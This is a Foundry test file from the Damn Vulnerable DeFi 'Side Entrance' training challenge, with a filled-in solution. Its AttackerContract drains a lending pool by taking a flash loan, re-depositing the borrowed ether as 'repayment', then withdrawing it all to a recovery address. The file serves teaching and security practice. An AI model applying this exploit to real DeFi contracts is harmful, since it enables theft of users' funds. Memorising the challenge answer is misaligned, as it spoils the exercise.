// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";

contract SideEntranceChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant ETHER_IN_POOL = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;

    SideEntranceLenderPool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        pool = new SideEntranceLenderPool();
        pool.deposit{value: ETHER_IN_POOL}();
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_sideEntrance() public checkSolvedByPlayer {
        console.log("Initial ether of the player: ", player.balance);
        console.log("Initial ether of the deployer: ", deployer.balance);
        console.log("Initial ether of the pool: ", address(pool).balance);
        console.log("Initial ether of the deployer in the pool: ", pool.balances(deployer));
        console.log("Initial ether of the recovery: ", recovery.balance);

        console.log("Initial ether of the player in the pool: ", pool.balances(player));
        pool.deposit{value: 1 ether}();
        console.log("Final-1 ether of the player in the pool: ", pool.balances(player));

        AttackerContract attack = new AttackerContract(pool, recovery, player, deployer);
        attack.attack();

        // player withdraws from the pool
        pool.withdraw();

        console.log("Balance of the AttackerContract contract in the pool after the full attack", pool.balances(address(this)));
        console.log("Balance of ether of the deployer in the pool after the full attack: ", pool.balances(deployer));
        console.log("Balance of ether of the player in the pool after the full attack: ", pool.balances(player));
        console.log("Balance of ether in the pool after the full attack: ", address(pool).balance);
        console.log("Balance of ether in the recovery account", recovery.balance);

    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(address(pool).balance, 0, "Pool still has ETH");
        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
    }
}

contract AttackerContract{
    SideEntranceLenderPool pool;
    address recovery;
    address player;
    address deployer;
    constructor(SideEntranceLenderPool _pool, address _recovery, address _player, address _deployer){
        pool = _pool;
        // do not call the other contract from the constructor, since a contract is never completely deployed during constructor.
        recovery = _recovery;
        player = _player;
        deployer = _deployer;
    }

    function attack() public {
        pool.flashLoan(pool.balances(deployer));
        
        pool.withdraw();

        (bool success, ) = payable(recovery).call{value: address(this).balance}("");
        require(success, "Amount sent successfully from the AttackerContract to the recovery address");

    }

    function execute() public payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable{}

}
